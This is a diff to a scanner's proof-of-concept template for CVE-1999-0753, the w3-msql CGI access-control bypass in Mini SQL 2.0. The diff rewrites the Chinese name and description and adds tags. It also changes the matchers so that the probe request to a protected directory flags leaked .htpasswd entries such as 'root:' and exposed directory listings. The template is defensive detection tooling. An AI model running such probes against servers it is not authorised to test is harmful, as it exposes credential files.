@@ -1,10 +1,15 @@
 [info]
-author = "ave"
-description = "检测 Hughes Technologies Mini SQL (mSQL) 2.0/2.0.10 中 w3-msql CGI 脚本的访问控制绕过漏洞。w3-msql 将表单数据自动转为全局 Lite 变量，导致攻击者可直接访问 .htaccess 保护的目录和文件，如 .htpasswd 文件。"
+author = "AVE"
+description = "检测目标服务器上 w3-msql CGI 脚本是否存在目录遍历漏洞。通过向 w3-msql 脚本发送特制 HTTP 请求，尝试访问受 .htaccess 保护的目录中的文件（如 .htpasswd），验证是否存在信息泄露风险。"
 id = "POC-AVE-1999-0606"
-name = "Hughes Technologies mSQL 2.0 w3-msql CGI Access Control Bypass PoC"
+name = "Hughes Technologies Mini SQL w3-msql CGI 目录遍历漏洞 PoC"
 severity = "high"
-tags = ["ave-1999-0606"]
+tags = [
+    "cve-1999-0753",
+    "msql",
+    "directory-traversal",
+    "cgi",
+]
 vuln_id = [
     "CVE-1999-0753",
     "AVE-1999-0606",
@@ -22,7 +27,12 @@ protocol = "http"
 expect = true
 part = "body"
 type = "word"
-words = [":"]
+words = [
+    "root:",
+    "admin:",
+    "www:",
+    ":",
+]
 
 [[poc.requests]]
 method = "GET"
@@ -30,10 +40,11 @@ path = "/{{BaseURL}}/cgi-bin/w3-msql/protected-directory/private-file"
 protocol = "http"
 
 [[poc.requests.matchers]]
-expect = false
+expect = true
 part = "body"
 type = "word"
 words = [
-    "cannot open",
-    "Error",
+    "Index of",
+    "Directory listing",
+    "parent directory",
 ]
